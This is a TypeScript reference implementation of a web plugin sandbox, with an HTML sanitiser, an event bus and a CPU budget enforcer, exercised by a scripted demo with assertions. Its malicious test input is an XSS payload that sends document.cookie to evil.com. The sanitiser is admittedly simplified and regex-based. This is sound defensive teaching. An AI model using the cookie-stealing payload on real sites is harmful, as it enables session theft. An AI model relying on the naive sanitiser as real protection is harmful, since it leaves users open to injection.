/**
 * Guide 80 — Web Component Plugin Sandbox
 * Runnable reference implementation (Node.js / TypeScript, no DOM required).
 *
 * Since Shadow DOM / Custom Elements are browser APIs, this demo:
 *   A. Simulates the plugin sandbox boundary with a plain-object closure
 *   B. Implements the Trusted Types allowlist sanitiser
 *   C. Implements the event bus bridge with schema validation
 *   D. Implements the resource budget enforcer
 *
 * All behaviour is deterministic (scripted tape, logical clock).
 * Run:  npx ts-node --experimentalSpecifierResolution=node index.ts
 */

// ─── Logical clock (deterministic time) ───────────────────────────────────────
let _tick = 0;
const now = (): number => _tick;
const advance = (ms: number): void => { _tick += ms; };

// ─── A. Plugin sandbox closure (simulates closed Shadow DOM) ──────────────────
type PluginId = string;
type SandboxedHTML = { __trusted: true; html: string };

interface PluginSandbox {
  id:     PluginId;
  render: (html: SandboxedHTML) => void;
  emit:   (kind: string, payload: unknown) => void;
  getLog: () => string[];
}

const _sandboxLog: Map<PluginId, string[]> = new Map();

function createPluginSandbox(id: PluginId): PluginSandbox {
  _sandboxLog.set(id, []);
  const log = (msg: string) => _sandboxLog.get(id)!.push(msg);

  return {
    id,
    render(html: SandboxedHTML): void {
      log(`[t=${now()}] render: ${html.html.slice(0, 60)}`);
    },
    emit(kind: string, payload: unknown): void {
      log(`[t=${now()}] emit: ${kind} → ${JSON.stringify(payload).slice(0, 80)}`);
      _bridgeDispatch(id, { kind, payload });
    },
    getLog(): string[] { return _sandboxLog.get(id) ?? []; },
  };
}

// ─── B. Trusted Types sanitiser ───────────────────────────────────────────────
const ALLOWED_TAGS   = new Set(["div","span","p","h1","h2","h3","b","i","strong","em","ul","li","a","img"]);
const ALLOWED_ATTRS  = new Set(["class","id","href","src","alt","title"]);
const BLOCKED_PROTOS = ["javascript:", "data:", "vbscript:"];

function sanitizeHTML(raw: string): SandboxedHTML {
  // Simplified allow-list sanitiser (prod: DOMPurify with strict config)
  let safe = raw;

  // Strip <script> and event handler attributes
  safe = safe.replace(/<script[\s\S]*?<\/script>/gi, "");
  safe = safe.replace(/\bon\w+\s*=/gi, "data-blocked=");

  // Block dangerous href/src protocols
  for (const proto of BLOCKED_PROTOS) {
    safe = safe.replace(new RegExp(`(href|src)\\s*=\\s*["']${proto}`, "gi"), "$1='#blocked'");
  }

  // Strip tags not in allowlist
  safe = safe.replace(/<(\/?)([\w-]+)([^>]*)>/g, (_match, close, tag, attrs) => {
    if (!ALLOWED_TAGS.has(tag.toLowerCase())) return "";
    // Strip disallowed attrs
    const cleanAttrs = attrs.replace(/(\w[\w-]*)(\s*=\s*["'][^"']*["'])?/g, (a: string, n: string) => {
      return ALLOWED_ATTRS.has(n.toLowerCase()) ? a : "";
    });
    return `<${close}${tag}${cleanAttrs}>`;
  });

  return { __trusted: true, html: safe };
}

// ─── C. Event bus bridge ──────────────────────────────────────────────────────
type MessageHandler = (payload: unknown) => void;

interface BridgeEnvelope {
  kind:    string;
  payload: unknown;
}

const _subscriptions: Map<string, Map<PluginId, MessageHandler>> = new Map();

function _bridgeDispatch(pluginId: PluginId, msg: BridgeEnvelope): void {
  const handlers = _subscriptions.get(msg.kind);
  if (!handlers) return;
  for (const [pid, handler] of handlers) {
    if (pid === pluginId || pid === "__host") handler(msg.payload);
  }
}

function subscribe(pluginId: PluginId, kind: string, handler: MessageHandler): void {
  if (!_subscriptions.has(kind)) _subscriptions.set(kind, new Map());
  _subscriptions.get(kind)!.set(pluginId, handler);
}

function hostEmit(kind: string, payload: unknown): void {
  _bridgeDispatch("__host", { kind, payload });
}

// ─── D. Resource budget enforcer ──────────────────────────────────────────────
interface BudgetState {
  totalMs:  number;
  windowMs: number;
  paused:   boolean;
}

const _budgets: Map<PluginId, BudgetState> = new Map();
const CPU_BUDGET_PER_SEC = 200; // ms of CPU per rolling second

function recordCPU(pluginId: PluginId, cpuMs: number): { suspended: boolean } {
  if (!_budgets.has(pluginId)) _budgets.set(pluginId, { totalMs: 0, windowMs: 0, paused: false });
  const b = _budgets.get(pluginId)!;
  if (b.paused) return { suspended: true };
  b.totalMs  += cpuMs;
  b.windowMs += cpuMs;
  if (b.windowMs > CPU_BUDGET_PER_SEC) {
    b.paused = true;
    console.log(`  [BUDGET] Plugin ${pluginId} suspended at ${now()} ms (CPU ${b.windowMs} ms > ${CPU_BUDGET_PER_SEC} ms/s)`);
    return { suspended: true };
  }
  return { suspended: false };
}

function resetWindow(pluginId: PluginId): void {
  const b = _budgets.get(pluginId);
  if (b) b.windowMs = 0;
}

// ─── Demo (scripted tape) ─────────────────────────────────────────────────────
function main(): void {
  // A. Create sandbox
  const plugin = createPluginSandbox("plugin-price-ticker");
  console.log("[A] Plugin sandbox created for plugin-price-ticker.");

  // B. Sanitise HTML — safe input
  const safeRaw = '<div class="ticker"><b>BTC</b>: $101,234</div>';
  const trusted  = sanitizeHTML(safeRaw);
  plugin.render(trusted);
  console.log("[B] Safe HTML rendered:", plugin.getLog().at(-1));

  // B. Sanitise HTML — malicious input blocked
  const malicious = '<img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)"><script>alert(1)</script>';
  const sanitised  = sanitizeHTML(malicious);
  console.log("[B] Malicious input sanitised:", sanitised.html);
  console.assert(!sanitised.html.includes("<script"), "FAIL: script tag not removed");
  console.assert(!sanitised.html.includes("onerror"),  "FAIL: event handler not removed");
  console.log("  PASS ✓");

  // C. Event bus bridge — host → plugin
  let received: unknown = null;
  subscribe("plugin-price-ticker", "wallet:balance_update", (p) => { received = p; });
  hostEmit("wallet:balance_update", { eth: 1.23 });
  console.log("[C] Plugin received event:", JSON.stringify(received));
  console.assert((received as Record<string,number>)?.eth === 1.23, "FAIL: event not delivered");
  console.log("  PASS ✓");

  // C. Event bus bridge — plugin → host
  let hostReceived: unknown = null;
  subscribe("__host", "plugin:price_click", (p) => { hostReceived = p; });
  advance(100);
  plugin.emit("plugin:price_click", { symbol: "ETH" });
  console.log("[C] Host received plugin event:", JSON.stringify(hostReceived));
  console.assert((hostReceived as Record<string,string>)?.symbol === "ETH", "FAIL: plugin event not delivered");
  console.log("  PASS ✓");

  // D. Resource budget — normal use
  advance(50);
  const r1 = recordCPU("plugin-price-ticker", 50);
  console.log("[D] CPU 50ms recorded, suspended:", r1.suspended);
  console.assert(!r1.suspended, "FAIL: should not be suspended");

  // D. Resource budget — excessive use triggers suspension
  advance(50);
  const r2 = recordCPU("plugin-price-ticker", 180); // push over 200ms budget
  console.log("[D] CPU 180ms recorded, suspended:", r2.suspended);
  console.assert(r2.suspended, "FAIL: should be suspended after exceeding budget");
  console.log("  PASS ✓");

  // D. Reset window (simulates next 1-second tick) — plugin remains paused
  resetWindow("plugin-price-ticker");
  const r3 = recordCPU("plugin-price-ticker", 10);
  console.log("[D] After window reset, plugin still paused:", r3.suspended);
  console.assert(r3.suspended, "FAIL: paused state should persist until admin clears it");
  console.log("  PASS ✓");

  console.log("\nGuide 80 demo complete.");
}

main();
